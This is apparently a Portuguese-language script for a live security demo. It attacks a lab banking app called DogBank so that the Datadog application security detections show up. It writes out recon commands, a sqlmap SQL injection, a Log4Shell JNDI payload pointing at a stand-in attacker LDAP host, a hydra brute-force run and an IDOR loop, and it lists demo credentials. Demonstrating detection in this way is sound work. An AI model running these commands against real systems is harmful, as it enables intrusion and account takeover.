# DogBank — Script de Demo de Segurança
## SE Connection | Script Kiddies vs DogBank

**Target:** `lab.dogbank.dog`
**Ferramenta de ataque:** Kali Linux
**Onde ver os alertas:** Datadog → Security → Application Security → Signals

---

## Fluxo Automático Recomendado

Use estes dois scripts quando a demo precisar parecer uma história contínua:

```bash
cd /demo
./evildog.sh
./evildog-exploit.sh
```

O primeiro script monta o reconhecimento visual, gera payloads de prova e orienta onde olhar no Datadog ASM. O segundo faz a exploração orientada por impacto: account takeover, dump via SQLi e Log4Shell/RCE.

---

## ATO 1 — RECONHECIMENTO

> _"Antes de qualquer ataque, o invasor mapeia o alvo. Isso leva menos de 1 minuto."_

### 1.1 Scan de portas e serviços
```bash
nmap -sV --open -p 80,443,8080,8088,8089,9090 lab.dogbank.dog
```
**O que mostrar:** Serviços Java/Spring Boot expostos, versões de software.

### 1.2 Fingerprinting da aplicação web
```bash
whatweb -v https://lab.dogbank.dog
```
**O que mostrar:** Framework, servidor, cookies sem flags de segurança.

### 1.3 Descoberta de endpoints escondidos
```bash
ffuf -u https://lab.dogbank.dog/FUZZ \
  -w /wordlists/spring-boot.txt \
  -mc 200,301,401 -v
```
**O que mostrar:** `/actuator/*` respondendo — dados internos da JVM expostos.

### 1.4 Verificar o Actuator (bomba visual para a audiência)
```bash
curl -sk https://lab.dogbank.dog/actuator | python3 -m json.tool
```
> Se retornar JSON: _"Isso é o painel de controle interno do servidor. Qualquer um pode acessar."_

### 1.5 Verificar headers de segurança
```bash
curl -sk -I https://lab.dogbank.dog | grep -iE "server|x-frame|strict-transport|content-security|x-powered"
```
**O que mostrar:** Headers ausentes = aplicação sem proteções básicas.

---

## ATO 2 — ATAQUES

### 2.1 SQL Injection com sqlmap
> _"Uma ferramenta, um comando, banco de dados exposto."_

```bash
sqlmap -u "https://lab.dogbank.dog/api/auth/login" \
  --data='{"cpf":"*","senha":"test"}' \
  --content-type="application/json" \
  --level=2 --risk=1 \
  --batch --dbs
```
**O que mostrar no Datadog:** Signal `SQL Injection Attack` aparecendo em tempo real no ASM.

---

### 2.2 Log4Shell — CVE-2021-44228
> _"Colocar um payload no User-Agent. É isso. Servidor executa código remoto."_

```bash
python3 /opt/log4j-scan/log4j-scan.py \
  -u https://lab.dogbank.dog \
  --run-all-tests
```

Ou manualmente:
```bash
curl -sk \
  -H 'User-Agent: ${jndi:ldap://attacker.dogbank.internal/exploit}' \
  -H 'Content-Type: application/json' \
  -d '{"cpf":"test","senha":"test"}' \
  https://lab.dogbank.dog/api/auth/login
```
**O que mostrar no Datadog:** Signal `Log4Shell Exploit Attempt` com o payload visível no trace.

---

### 2.3 Brute Force de login com hydra
> _"Lista de senhas + CPF. O rate limiter do Redis vai bloquear — e o Datadog vai detectar."_

```bash
hydra -L /wordlists/cpfs.txt \
  -P /wordlists/passwords.txt \
  -s 443 lab.dogbank.dog \
  https-post-form \
  "/api/auth/login:{\"cpf\":\"^USER^\",\"senha\":\"^PASS^\"}:F=Senha inválida" \
  -t 5 -V
```
**O que mostrar no Datadog:** Signal `Credential Stuffing` + logs com pico de 401s + rate limit bloqueando após 5 tentativas.

---

### 2.4 Scan automático de vulnerabilidades com nikto
> _"Script kiddie clássico — roda um scanner e espera o relatório."_

```bash
nikto -h https://lab.dogbank.dog -ssl -Tuning 1234789
```
**O que mostrar:** Lista de headers ausentes, métodos perigosos, arquivos sensíveis.

---

### 2.5 Descoberta de IDs de outros usuários (IDOR)
> _"Troca o número na URL. Acessa dados de outro cliente."_

```bash
for i in 1 2 3 4 5; do
  echo "=== Usuario $i ==="
  curl -sk "https://lab.dogbank.dog/api/transactions/history?userId=$i" \
    -H "Authorization: Bearer SEU_TOKEN_AQUI" | python3 -m json.tool 2>/dev/null
done
```

---

## ATO 3 — DETECÇÃO NO DATADOG

> _"Enquanto o ataque acontecia, o Datadog estava vendo tudo."_

### Onde mostrar:

| O que abrir | Caminho no Datadog |
|---|---|
| Signals em tempo real | Security → Application Security → Signals |
| Trace com payload do ataque | APM → Traces → filtrar por `service:auth-service` |
| Logs com pico de 401 | Logs → `service:auth-service status:error` |
| Rate limit bloqueando | Logs → `@message:RateLimit` |
| Mapa de serviços atacados | APM → Service Map |

---

## ATO 4 — RESPOSTA AUTOMATIZADA

> _"Sem toque humano. O Datadog detectou, bloqueou e notificou."_

- Workflow dispara ao receber signal de Brute Force
- Chama `POST /api/auth/admin/block-user` automaticamente
- Slack recebe: _"🚨 IP bloqueado automaticamente pelo Datadog"_

---

## Credenciais de demo (DogBank)

| Campo | Valor |
|---|---|
| CPF válido | `12345678915` |
| Senha | `123456` |
| Admin token | `changeme-block-token` |
| Target | `https://lab.dogbank.dog` |

---

## Ordem recomendada (15 min)

1. `./evildog.sh` → 7 min — "reconhecimento, payloads e signals do ASM"
2. Datadog ASM → 3 min — "timeline completa do ataque"
3. `./evildog-exploit.sh` → 4 min — "impacto real: conta, banco, secrets"
4. Datadog ASM + APM/Logs → 1 min — "correlação signal → trace → log"
